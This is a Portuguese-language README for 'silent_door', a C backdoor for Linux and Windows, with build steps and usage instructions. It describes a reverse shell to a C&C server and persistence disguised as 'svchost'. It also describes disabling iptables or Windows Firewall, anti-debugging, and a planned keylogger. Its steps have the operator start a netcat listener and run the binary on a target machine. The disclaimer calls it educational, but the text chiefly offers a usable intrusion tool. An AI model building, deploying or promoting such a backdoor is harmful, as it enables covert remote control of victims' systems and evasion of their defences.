# silent_door

Um backdoor clássico escrito na linguagem C, com foco em portabilidade e aprendizado.

Este projeto está em constante desenvolvimento.

---

## Compilação

Primeiro, clone o repositório:
```bash
git clone https://github.com/mrx6SO/silent_door
cd silent_door
```

### Dependências (Linux)
Para compilar em sistemas baseados em Debian (Ubuntu, etc.), você precisará das ferramentas de compilação e da biblioteca `libx11-dev`.
```bash
sudo apt update
sudo apt install build-essential libx11-dev
```

### Usando o Makefile
O projeto utiliza um `Makefile` para automatizar a compilação para Linux e Windows (via cross-compilation).

*   **Para compilar a versão Linux:**
    ```bash
    make linux
    ```
    Isso gerará o executável `silent_door_linux`.

*   **Para compilar a versão Windows (requer MinGW):**
    ```bash
    # Instale o cross-compiler MinGW
    sudo apt install mingw-w64
    
    # Compile
    make windows
    ```
    Isso gerará o executável `silent_door.exe`.

---

## Funcionalidades

### Implementadas
*   **Conexão Reversa:** Estabelece um shell reverso para um servidor C&C.
*   **Multiplataforma:** Código portável entre Linux e Windows com compilação condicional.
*   **Modo Daemon/Background:** Executa de forma oculta em segundo plano.
*   **Persistência Simples:** Copia-se para um diretório do sistema (`/usr/bin/svchost` no Linux).
*   **Evasão de Firewall:** Tenta desabilitar `iptables` (Linux) ou o Firewall do Windows.
*   **Técnicas Anti-Análise:** Inclui detecção básica de depuradores.

### Em Desenvolvimento
*   Comunicação Criptografada (TLS/SSL).
*   Mecanismo de persistência avançado (Registro do Windows, systemd no Linux).
*   Keylogger passivo com envio de logs.
*   Funcionalidades de Upload/Download de arquivos.
*   Mapeamento da rede interna da máquina alvo.

---

## Uso Básico

1.  **No seu servidor**, inicie um listener na porta configurada (padrão: 3389):
    ```bash
    nc -lvp 3389
    ```

2.  **Na máquina alvo**, execute o backdoor:
    ```bash
    ./silent_door_linux
    ```

3.  A conexão será estabelecida e um shell remoto estará disponível no seu servidor.

---

## Aviso Legal

Este projeto foi criado para fins educacionais e de estudo em segurança da informação. O autor não se responsabiliza pelo mau uso desta ferramenta. Use-a apenas em ambientes controlados e com permissão explícita.

**Referencie o autor original (`mrx6SO`) caso utilize ou redistribua este código.**
